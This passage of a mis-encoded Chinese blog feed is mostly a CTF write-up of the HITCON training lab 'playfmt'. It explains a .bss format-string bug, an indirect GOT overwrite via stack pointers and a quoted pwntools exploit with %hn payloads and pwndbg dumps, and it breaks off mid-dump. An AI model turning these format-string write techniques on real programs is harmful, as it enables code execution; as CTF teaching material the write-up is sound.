operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1 <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> sys <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">":"</span> -f1 <span class="token operator">|</span> <span class="token function">sort</span> -uåªä¿ç•™å¯ä»¥åœ¨linuxä¸‹è¿è¡Œçš„ä»£ç Metasploit:svn update å‡çº§./msfweb Webæ¥å£127.0.0.1:55555ã€‚../msfconsole å­—ç¬¦ä¸‹çš„Consoleã€‚<span class="token function">help</span> å¸®åŠ©show æ˜¾ç¤ºé€‰é¡¹ searc</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linuxé‡å®šå‘ </tag>
            
            <tag> å¸¸ç”¨å‘½ä»¤é›† </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ31-Hitcon-äº”</title>
      <link href="/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/"/>
      <url>/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-åæœˆ31-Hitcon-äº”"><a href="#Pwn-åæœˆ31-Hitcon-äº”" class="headerlink" title="Pwn-åæœˆ31-Hitcon-äº”"></a>Pwn-åæœˆ31-Hitcon-äº”</h1><blockquote><p>é¸½äº†å‡ å¤©ä¹‹åï¼Œç»§ç»­ç»ƒä¹ HitconğŸ˜­ğŸ†’ã€‚</p></blockquote><h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; åŒæ ·ï¼Œè¿™ä¸€é¢˜ä¹Ÿæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è¿™é¢˜çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åœ¨å…¨å±€å˜é‡ï¼ˆ.bss)æ®µï¼Ÿï¼Ÿï¼Ÿä»€ä¹ˆæƒ…å†µğŸ™ƒã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€ä»¥è¿™é¢˜æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡æ§åˆ¶æ ˆä¸Šå˜é‡æ¥ä¿®æ”¹Gotè¡¨ï¼Œé‚£æ„æ€æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±å¯ä»¥é€šè¿‡é—´æ¥çš„æ–¹å¼æ¥ä¿®æ”¹Gotè¡¨å†…å®¹å’¯ã€‚</p></blockquote><h3 id="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec playfmt</code>:</p><p><img src="https://i.loli.net/2018/10/31/5bd9a7693eb66.png" alt=""></p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡çš„printfå‡½æ•°bufä¸åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åœ¨bssæ®µã€‚</p></blockquote><p><img src="https://i.loli.net/2018/10/31/5bd9a9c834154.png" alt=""></p><p>IDAçœ‹ä¸€çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/31/5bd9ab6a202f0.png" alt=""></p><p>çš„ç¡®æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œå¾ˆæ˜æ˜¾å’¯ã€‚</p><p><img src="https://i.loli.net/2018/10/31/5bd9accfc0a7b.png" alt=""></p><p>ç”¨gdbè°ƒè¯•ï¼Œå¹¶ä¸”è¾“å…¥4ä¸ªaï¼Œå¯ä»¥çœ‹åˆ°bufä¸åœ¨æ ˆä¸Šã€‚</p><blockquote><p> å¼•ç”¨å¤§ä½¬çš„è¯ï¼š<code>é€šè¿‡ä¿®æ”¹æ ˆä¸­å­˜åœ¨çš„æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘æ ˆä¸Šçš„å˜é‡ï¼Œå¯ä»¥é—´æ¥åœ°å®ç°å†™gotï¼Œè¿™ç§æ–¹å¼æ˜¯ä¸€ç§å¸¸è§çš„å¥—è·¯ã€‚</code></p><p> c/c++ä¸­çš„<code>%n</code>æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå®ƒæ˜¯è¾“å…¥æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦ï¼Œåœ¨è¿™é¢˜ä¸­å¯ä»¥ç”¨äºä¿®æ”¹æ ˆä¸­å˜é‡çš„å€¼ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥åœ¨printfå‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ ˆä¸­å˜é‡æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/31/5bd9b9c7dc455.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¯ä»¥çœ‹åˆ°åç§»é‡ä¸º6çš„åœ°æ–¹æ˜¯ebpï¼Œè€ŒebpæŒ‡å‘äº†å¦å¤–ä¸€ä¸ªåœ°å€ï¼Œå³åç§»é‡ä¸º10çš„åœ°æ–¹ï¼Œç„¶ååˆæŒ‡å‘åç§»é‡ä¸º15çš„ä½ç½®ã€‚è¿™é‡Œæˆ‘ä»¬å…¶å®å¯ä»¥èµ°ä¸€æ­¥æ·å¾„ï¼Œé€šè¿‡è·å¾—åç§»é‡ä¸º8çš„åœ°æ–¹è¿™ä¸ªå‡½æ•°åœ°å€ï¼Œleakå‡ºlibcåŸºåœ°å€ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ­£æ˜¯å› ä¸ºç¨‹åºæ˜¯å¾ªç¯è¿è¡Œï¼Œæ‰€ä»¥ç»™äº†æˆ‘ä»¬è¶³å¤Ÿå¤šæ¬¡æ•°æ¥é—´æ¥è¦†å†™GOTè¡¨ã€‚</p><blockquote><p> è§£é¢˜é€»è¾‘ï¼ˆ<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">æ¥è‡ª23r3f</a> ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"> ebp_1 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">6</span><span class="token punctuation">,</span> å³$ebp ebp_2 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">10</span><span class="token punctuation">,</span> å³$ebpçš„å€¼åœ°å€ fmt_7 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">7</span> fmt_11 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">11</span></code></pre><p> &nbsp; &nbsp; &nbsp; &nbsp; ebp1çš„å†…å®¹æ˜¯æŒ‡å‘ebp2çš„åœ°å€çš„æŒ‡é’ˆï¼Œè€Œebp2çš„å†…å®¹åˆæ˜¯æŒ‡å‘å…¶ä»–åœ°å€çš„æŒ‡é’ˆï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ç”¨%nå¯¹ebp1è¿›è¡Œæ“ä½œï¼Œé‚£ä¹ˆå®é™…ä¸Šä¼šä¿®æ”¹ebp2çš„å€¼ï¼Œå¦‚æœæ­¤æ—¶å†æŠŠebp2çš„å†…å®¹æ”¹æˆä¸€ä¸ªæŒ‡å‘fmt7çš„æŒ‡é’ˆï¼Œç„¶ååœ¨å¯¹ebp2è¿›è¡Œ%næ“ä½œï¼Œé‚£ä¹ˆå°±å¯ä»¥æ”¹å˜fmt7çš„å†…å®¹ï¼Œä»è€Œå®ç°äº†é—´æ¥ä¿®æ”¹æŸä¸ªåœ°å€çš„å†…å®¹ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬æŠŠfmt7çš„å†…å®¹åˆæ”¹æˆprintfçš„gotè¡¨åœ°å€ï¼Œé‚£ä¹ˆfmt7å°±æŒ‡å‘äº†printf_gotçš„åœ°å€ï¼Œå¦‚æœç”¨%sæ“ä½œï¼Œå°±å¯ä»¥æŠŠprintf_gotçš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°äº†printfå‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œåˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡printfå‡½æ•°æ³„æ¼å‡ºsystemçš„çœŸæ­£åœ°å€äº†ã€‚</p><p> å…·ä½“æ€è·¯ï¼š</p><pre class=" language-python"><code class="language-python"> <span class="token number">1</span><span class="token punctuation">.</span>é€šè¿‡ebp_1ä½¿ebp_2æŒ‡å‘fmt_7 <span class="token number">2</span><span class="token punctuation">.</span>é€šè¿‡ebp_2å°†fmt_7å¤„çš„å†…å®¹è¦†ç›–æˆprintf_got <span class="token number">3</span><span class="token punctuation">.</span>é€šè¿‡ebp_1ä½¿ebp_2æŒ‡å‘fmt_11 <span class="token number">4</span><span class="token punctuation">.</span>é€šè¿‡ebp_2å°†fmt_11å¤„çš„å†…å®¹ä¿®æ”¹æˆprintf_got<span class="token operator">+</span><span class="token number">2</span> <span class="token number">5</span><span class="token punctuation">.</span>é€šè¿‡fmt_7å°†printf_gotåœ°å€æ³„éœ²å‡ºæ¥ <span class="token number">6</span><span class="token punctuation">.</span>è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ <span class="token punctuation">,</span>å°†systemå‡½æ•°åœ°å€å†™å…¥printfåœ¨gotè¡¨çš„åœ°å€ å…·ä½“åšæ³•æ˜¯å°† systemå‡½æ•°åœ°å€çš„å‰ä¸¤ä¸ªå­—èŠ‚å†™å…¥fmt_7<span class="token punctuation">,</span>åä¸¤ä¸ªå­—èŠ‚å†™å…¥ fmt_11 <span class="token number">7</span><span class="token punctuation">.</span>æ‰§è¡Œprintfå‡½æ•°ç›¸å½“äºæ‰§è¡Œsystemå‡½æ•° <span class="token number">8</span><span class="token punctuation">.</span>è¾“å…¥<span class="token string">"/bin/sh"</span>å­—ç¬¦ä¸²ï¼Œè®©systemå‡½æ•°ä»æ ˆä¸­å–å‚æ•°getshell</code></pre></blockquote><p>æ¥ä¸‹æ¥ç›´æ¥é€šè¿‡ç†è§£å„ä½å¤§ä½¬expçš„æ–¹å¼ï¼Œæ¥æ·±å…¥ç†è§£è¿™ä¸€é“é¢˜ï¼ˆå¤ªèœäº†æˆ‘ï¼‰ã€‚</p><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>ä¸‰ä»½å¤§ä½¬EXPå„æœ‰ä¸åŒæŠ€å·§ï¼šåˆ†åˆ«æ¥è‡ªM4xï¼Œ23r3fï¼Œveritas501</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>__Auther__ <span class="token operator">=</span> <span class="token string">'M4x'</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Breakpoint *do_fmt+64pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "..%8$p....%6$p."...0x804a06f &lt;buf+15>:    ".11111111"0x804a079 &lt;buf+25>:    ""pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x38252e2e ('..%8')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa083d6 â—‚â€” './playfmt'16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa083e0 â—‚â€” 'NO_AT_BRIDGE=1'17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *do_fmt+64\nc"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"..%8$p....%6$p..11111111\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x28</span>success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%30684c%21$hn%1"...0x804a06f &lt;buf+15>:    "6c%22$hn2222222"...0x804a07e &lt;buf+30>:    "2"pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x36303325 ('%306')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa083d6 â—‚â€” './playfmt'16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa083e0 â—‚â€” 'NO_AT_BRIDGE=1'17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'22222222\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"11111111"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%40976c%57$hn%2"...0x804a06f &lt;buf+15>:    "c%59$hn33333333"0x804a07e &lt;buf+30>:    ""pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x39303425 ('%409')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"33333333\0"</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"22222222"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%211c%11$hhn%31"...0x804a06f &lt;buf+15>:    "325c%7$hn444444"...0x804a07e &lt;buf+30>:    "44"pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d46930 (printf) â—‚â€” call   0xf7e1dae908:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d40c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â—‚â€” 0xf7d4693016:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d417:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“pwndbg> n0x08048540 in do_fmt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATAâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAX  0x7b38 EBX  0x0 ECX  0xffa052a0 â—‚â€” 0x20202020 ('    ') EDX  0xf7eb1870 (_IO_stdfile_1_lock) â—‚â€” 0x0 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 ESI  0x1 EBP  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x0 ESP  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211') EIP  0x8048540 (do_fmt+69) â—‚â€” add    esp, 0x10â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   0x804853b &lt;do_fmt+64>    call   printf@plt &lt;0x80483a0> â–º 0x8048540 &lt;do_fmt+69>    add    esp, 0x10   0x8048543 &lt;do_fmt+72>    jmp    do_fmt+6 &lt;0x8048501>    â†“   0x8048501 &lt;do_fmt+6>     sub    esp, 4   0x8048504 &lt;do_fmt+9>     push   0xc8   0x8048509 &lt;do_fmt+14>    push   buf &lt;0x804a060>   0x804850e &lt;do_fmt+19>    push   